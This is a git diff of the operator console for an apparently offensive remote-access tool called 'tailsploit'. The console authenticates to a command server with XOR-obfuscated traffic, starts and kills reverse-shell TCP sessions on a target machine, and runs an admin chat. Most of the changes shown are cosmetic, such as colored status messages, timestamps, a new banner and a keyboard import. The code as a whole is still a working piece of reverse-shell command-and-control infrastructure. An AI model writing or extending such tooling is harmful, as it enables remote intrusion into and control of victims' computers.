@@ -9,6 +9,7 @@ import pyaudio
 import datetime
 import folium
 import requests
+import keyboard
 
 # Set up audio capture
 CHUNK_SIZE = 2048
@@ -53,11 +54,7 @@ class AdminShell:
             print(
                 f"""
 
-
-                   ┏┳┓┏┓┳┓ ┏┓┏┓┓ ┏┓┳┏┳┓
-                    ┃ ┣┫┃┃ ┗┓┃┃┃ ┃┃┃ ┃ 
-                    ┻ ┛┗┻┗┛┗┛┣┛┗┛┗┛┻ ┻ 
-                    
+                ///
 
         github/{Fore.RED}devmalcolm{Style.RESET_ALL}
     """
@@ -111,7 +108,6 @@ Please check your status or contact the server administrator for further informa
 """)
 
     def handleXOREncryption(self, content_data, key_traffic):
-        # Repeat the key to match the data length
         key_traffic = (
             key_traffic * (len(content_data) // len(key_traffic))
             + key_traffic[: len(content_data) % len(key_traffic)]
@@ -133,18 +129,17 @@ Please check your status or contact the server administrator for further informa
             self.isAuthenticated = True
             self.OnAuthenticationMFA(AdminShellSocket)
         elif OnAuthenticationResult == "--FLAG_PROVIDED_TOKEN_ALREADY_IN_USE":
-            print("[-] The provided token is already in use, please use another one")
+            print(f"{Fore.RED}[-]{Style.RESET_ALL} The provided token is already in use, please use another one")
             self.isAuthenticated = False
         elif OnAuthenticationResult == "--FLAG_PROVIDED_TOKEN_NOT_VALID":
-            print("[-] The provided token not valid, please use another one.")
+            print(f"{Fore.RED}[-]{Style.RESET_ALL} The provided token not valid, please use another one.")
             self.isAuthenticated = False
         elif OnAuthenticationResult == "--FLAG_PROVIDED_TOKEN_REVOKED":
-            print("[-] The provided token has been revoked.")
+            print(f"{Fore.RED}[-]{Style.RESET_ALL} The provided token has been revoked.")
             self.isAuthenticated = False
         else:
-            print(OnAuthenticationResult)
             self.isAuthenticated = False
-            print("Error")
+            print(f"{Fore.RED}[-]{Style.RESET_ALL} An error occured while checking your authentication token.")
         
     def OnAuthenticationMFA(self, AdminShellSocket):
         OnAuthenticationMFAStatusXOR = AdminShellSocket.recv(1024)
@@ -233,16 +228,18 @@ Please check your status or contact the server administrator for further informa
 
     def exit_chat(self):
         if self.chat_thread:
-            self.exit_chat_flag = True  # Set the exit flag
+            self.exit_chat_flag = True 
             self.chat_mode = False
             try:
-                self.chat_thread.join(timeout=5)  # Wait for the chat thread to finish with a timeout
+                self.chat_thread.join(timeout=5) 
             except Exception as e:
                 print(e)
             if self.chat_thread.is_alive():
                 print("Chat thread did not terminate in time. Continuing without joining.")
             else:
-                print("Chat thread terminated successfully.")
+                print("")
+                print(f"{Fore.RED}[*]{Style.RESET_ALL} Exiting chat session...")
+                print("")
             self.chat_thread = None
 
 
@@ -280,20 +277,25 @@ Please check your status or contact the server administrator for further informa
         print("")
         while self.isAuthenticated:
             if self.chat_mode:
+                #self.receive_messages(AdminShellSocket)
+                self.current_input = ""
                 message = input("> ")
                 if message == "/exitchat":
-                    self.exit_chat()  # Stop the chat thread
-                    print("TERMINATED")
+                    self.exit_chat()
                     continue
                 elif message == "":
+                    print("\033[F\033[K", end="")
                     continue
                 else:
                     self.send_chat_message(message, AdminShellSocket)
                     print("\033[F\033[K", end="")
+                    self.current_input = message
+                    continue
+
             else:
                 if self.TARGET_CLIENT:
                     adminShell = input(
-                        f"\x1B[4mtailsploit\x1B[0m ~ shell({Fore.RED}{REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.RED}{REVERSE_SHELL_PORT}{Style.RESET_ALL}) > "
+                        f"\x1B[4mtailsploit\x1B[0m ~ {Fore.RED}({REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.RED}{REVERSE_SHELL_PORT}){Style.RESET_ALL} > "
                     )
                 else:
                     adminShell = input(
@@ -373,11 +375,13 @@ Please check your status or contact the server administrator for further informa
                                 os.system("cls")
                             else:
                                 os.system("clear")
+                            CurrentTimeSession = datetime.datetime.now()
+                            FormattedTimeSession = CurrentTimeSession.strftime("%a %b %d %H:%M:%S %Y")
                             print("")
                             print(
-                                f"[{Fore.BLUE}*{Style.RESET_ALL}] Started Reverse Shell (TCP) Session Handler On {REVERSE_SHELL_IP}:{REVERSE_SHELL_PORT}"
+                                f"{Fore.GREEN}[*]{Style.RESET_ALL} Started Reverse Shell (TCP) Session Handler On {Fore.GREEN}{REVERSE_SHELL_IP}{Style.RESET_ALL}:{Fore.GREEN}{REVERSE_SHELL_PORT}{Style.RESET_ALL}"
                             )
-                            print(f"[{Fore.BLUE}*{Style.RESET_ALL}] Server Started.")
+                            print(f"{Fore.GREEN}[*]{Style.RESET_ALL} TCP Session Started At {FormattedTimeSession}")
                             print("")
                             break
                         elif "--FLAG_KILL_SESSION_REVERSE_TCP_SUCCESS" in ServerShell:
@@ -542,8 +546,13 @@ Please check your status or contact the server administrator for further informa
                 messageDecoded = self.handleXOREncryption(message, self.TRAFFIC_ENCRYPTION_TOKEN).decode("utf-8")
                 
                 if "--FLAG_MESSAGE_MODE_ADMN_FORWARDED" in messageDecoded:
-                    message_content = messageDecoded.replace("--FLAG_MESSAGE_MODE_ADMN_FORWARDED", "")
-                    print(f"{message_content}")
+                    message_content = messageDecoded.replace("--FLAG_MESSAGE_MODE_ADMN_FORWARDED", "").strip()
+                    current_time = datetime.datetime.now()
+                    formatted_time = current_time.strftime("%H:%M:%S")
+
+                    if message_content:
+                        print("\033[F\033[K" + formatted_time + f" - {message_content}", end="\n\n")
+                        keyboard.press_and_release('enter')
                 else:
                     pass
             except BlockingIOError:
